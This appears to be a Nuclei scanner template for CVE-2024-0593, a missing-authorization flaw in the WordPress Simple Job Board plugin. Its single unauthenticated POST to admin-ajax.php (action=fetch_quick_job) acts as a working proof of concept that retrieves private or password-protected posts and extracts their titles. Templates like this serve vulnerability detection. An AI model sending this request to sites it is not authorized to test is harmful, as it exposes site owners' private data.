id: CVE-2024-0593

info:
  name: WordPress Simple Job Board - Unauthorized Data Access
  author: zer0p0int
  severity: medium
  description: |
    The Simple Job Board plugin for WordPress is vulnerable to unauthorized access of data due to insufficient authorization checking on the fetch_quick_job() function in all versions up to, and including, 2.10.8. This makes it possible for unauthenticated attackers to fetch arbitrary posts, which can be password protected or private and contain sensitive information.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-0593
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a28a161-3dbc-4ef0-a2ce-4c102cf3cbb0
    - https://plugins.trac.wordpress.org/changeset/3038476/simple-job-board/trunk/includes/class-simple-job-board-ajax.php
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-0593
    cwe-id: CWE-862
    cpe: cpe:2.3:a:awsm:simple_job_board:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: awsm
    product: simple_job_board
    publicado: "2024-02-21"
  tags: cve,cve2024,wordpress,wp-plugin,simple-job-board,unauth,disclosure

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "action=fetch_quick_job&job_id=1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '<div class="popup-outer">[\s\S]*?<div class="job-description" id="job-desc">'
          - '"success":\s*true'
        condition: or

      - type: word
        part: body
        words:
          - "job-description"
          - "popup-outer"
        condition: or

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"job_title":\s*"([^"]*)"'
          - '<h2[^>]*class="job-title"[^>]*>([^<]+)</h2>'